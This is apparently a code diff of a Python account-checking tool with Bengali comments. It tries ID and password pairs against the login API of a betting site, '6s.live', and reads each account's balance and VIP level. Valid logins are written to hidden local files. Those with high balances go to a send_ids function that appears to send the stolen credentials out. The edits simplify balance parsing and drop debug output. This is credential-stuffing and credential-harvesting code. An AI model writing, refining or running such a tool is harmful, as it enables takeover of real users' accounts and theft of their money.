@@ -16,8 +16,6 @@ D = '[0m'
 C = '[96m'
 domain = '6s.live'
 
-DEBUG_MODE = False  # True করলে API রেস্পন্স দেখতে পাবেন
-
 def show_logo():
     os.system('cls' if os.name == 'nt' else 'clear')
     RESET = '[0m'
@@ -90,37 +88,16 @@ def attempt_login(user_id, pw):
             data = json.loads(response.read().decode())
             status_code = data.get('status')
             
-            # DEBUG: API response দেখার জন্য
-            if DEBUG_MODE:
-                print(f"{C}DEBUG API Response: {json.dumps(data, indent=2)}{D}")
-            
             if status_code == '000000':
-                user_data = data.get('data', {})
-                uid = user_data.get('userId', user_id)
-                uname = user_data.get('userName', uid)
+                uid = data.get('data', {}).get('userId')
+                uname = data.get('data', {}).get('userName')
+                balance = data.get('data', {}).get('mainWallet', 0)  # Default 0
+                level = data.get('data', {}).get('vipInfo', {}).get('nowVipName', 'Normal')
                 
-                # ব্যালেন্স সঠিকভাবে পাওয়ার চেষ্টা
-                balance = user_data.get('mainWallet')
-                if balance is None:
-                    # অন্য কোনো ফিল্ডে ব্যালেন্স থাকতে পারে
-                    balance = user_data.get('balance') or user_data.get('walletBalance') or user_data.get('availableBalance') or 0
+                # ব্যালেন্স ঠিক করা
+                if balance is None or balance == '' or str(balance).lower() == 'n/a':
+                    balance = 0
                 
-                level = 'Normal'
-                vip_info = user_data.get('vipInfo', {})
-                if isinstance(vip_info, dict):
-                    level = vip_info.get('nowVipName', 'Normal')
-                
-                # ব্যালেন্সকে ইন্টিজার/স্ট্রিং এ কনভার্ট
-                try:
-                    if balance is None or balance == '' or str(balance).lower() == 'n/a':
-                        balance = 0
-                    balance_int = int(float(balance))
-                    balance_str = str(balance_int)
-                except (ValueError, TypeError):
-                    balance_int = 0
-                    balance_str = '0'
-                
-                # প্রোফাইল লেভেল নির্ধারণ
                 if level != 'Normal':
                     lvl = 'Good'
                     ern = '2 BDT'
@@ -128,26 +105,31 @@ def attempt_login(user_id, pw):
                     lvl = 'Poor'
                     ern = '1 BDT'
                 
-                # ব্যালেন্সের উপর ভিত্তি করে আউটপুট
-                if balance_int >= 10000:
-                    msg = f'{BOLD}{C} {uname} | Balance: {balance_str} | Profile: {lvl} | Earned: 100 BDT {D}'
-                    print(msg)
-                    send_ids(uid, pw, balance_str, level)
-                elif 1500 <= balance_int <= 9999:
-                    msg = f'{BOLD}{G} {uname} | Balance: {balance_str} | Profile: {lvl} | Earned: 50 BDT {D}'
-                    print(msg)
-                    send_ids(uid, pw, balance_str, level)
-                else:
-                    msg = f'{BOLD}{Y} {uname} | Balance: {balance_str} | Profile: {lvl} | Earned: {ern} {D}'
+                try:
+                    balance_int = int(balance)
+                    if balance_int >= 10000:
+                        msg = f'{BOLD}{C} {uname} | Profile : {lvl} | Earned : 100 BDT {D}'
+                        print(msg)
+                        send_ids(uid, pw, balance, level)
+                    elif 1500 <= balance_int <= 9999:
+                        msg = f'{BOLD}{G} {uname} | Profile : {lvl} | Earned : 50 BDT {D}'
+                        print(msg)
+                        send_ids(uid, pw, balance, level)
+                    else:
+                        msg = f'{BOLD}{Y} {uname} | Profile : {lvl} | Earned : {ern} {D}'
+                        print(msg)
+                except (ValueError, TypeError):
+                    balance = 0
+                    msg = f'{BOLD}{Y} {uname} | Profile : {lvl} | Earned : {ern} {D}'
                     print(msg)
                 
                 # ফাইলে সেভ করা
                 if level == 'Normal':
                     with open('.normal.txt', 'a', encoding='utf-8') as f:
-                        f.write(f'{uid} | {pw} | Balance: {balance_str} | Level: {level}\n')
+                        f.write(f'{uid} | {pw} | Balance: {balance} | Level: {level}\n')
                 else:
                     with open('.high.txt', 'a', encoding='utf-8') as f:
-                        f.write(f'{uid} | {pw} | Balance: {balance_str} | Level: {level}\n')
+                        f.write(f'{uid} | {pw} | Balance: {balance} | Level: {level}\n')
                         
             elif status_code == 'S0001':
                 print(f'{R} [!] TURN OFF YOUR DATA FOR A WHILE (API LIMIT OVER){D}')
@@ -159,7 +141,7 @@ def attempt_login(user_id, pw):
             time.sleep(10)
             
     except Exception as e:
-        print(f'{R} Error for {user_id}: {e}{D}')
+        print(f'{R} Error: {e}{D}')
         time.sleep(3)
 
 def send_ids(uid, pw, balance, level, retries=3, delay=2):
@@ -219,7 +201,6 @@ def switch():
         exit(0)
     except Exception as e:
         print(f'{R} Switch check failed: {e}{D}')
-        # Continue execution if switch check fails
 
 if __name__ == '__main__':
     switch()
